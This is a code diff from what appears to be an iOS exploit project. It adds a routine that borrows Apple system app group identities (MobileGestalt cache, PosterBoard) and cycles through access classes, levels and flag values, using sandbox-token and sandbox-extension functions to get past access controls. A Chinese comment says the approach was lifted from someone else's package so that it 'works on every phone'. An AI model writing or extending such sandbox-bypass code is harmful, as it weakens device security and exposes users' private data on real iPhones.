@@ -284,6 +284,32 @@ static int64_t wq_traverse_routes(NSString *group, NSString *target,
                                   int *out_last_class, int *out_last_flag_index) {
     int64_t last = -5;
     int lastClass = 2, lastIndex = -1;
+    // 2026-11-11 拆人家原包对齐：人家借通行证不认签名带的组，class 7
+    // 直接拿系统自带组当身份（systemgroup.com.apple.mobilegestaltcache、
+    // group.com.apple.PosterBoard），所以谁的手机都一样。层数按 8/7/9
+    // 都试，两套 flags，谁成用谁；全不行再退回签名组的路。
+    NSString *kVellumIds[2] = { @"systemgroup.com.apple.mobilegestaltcache",
+                                @"group.com.apple.PosterBoard" };
+    int attempt = 0;
+    for (int idIdx = 0; idIdx < 2; idIdx++) {
+        for (int lv = 0; lv < 3; lv++) {
+            int up = lv == 0 ? 8 : (lv == 1 ? 7 : 9);
+            for (int f = 0; f < 2; f++) {
+                uint64_t flag = f == 0 ? 0x0000008000000000ULL : 0x0000000800000000ULL;
+                int64_t h = wq_attempt_traverse(7, flag, up, kVellumIds[idIdx], target,
+                                                query_create, query_set_class, query_set_group_identifiers,
+                                                query_set_flags, query_set_part, query_set_part_domain,
+                                                query_get_single_result, query_free,
+                                                copy_sandbox_token, consume_extension);
+                if (h >= 0) {
+                    if (out_last_class) *out_last_class = 7;
+                    if (out_last_flag_index) *out_last_flag_index = attempt;
+                    return h;
+                }
+                last = h; lastClass = 7; lastIndex = attempt++;
+            }
+        }
+    }
     for (int f = 0; f < 2; f++) {
         uint64_t flag = f == 0 ? 0x0000008000000000ULL : 0x0000000800000000ULL;
         int64_t h = wq_attempt_traverse(2, flag, 8, group, target,
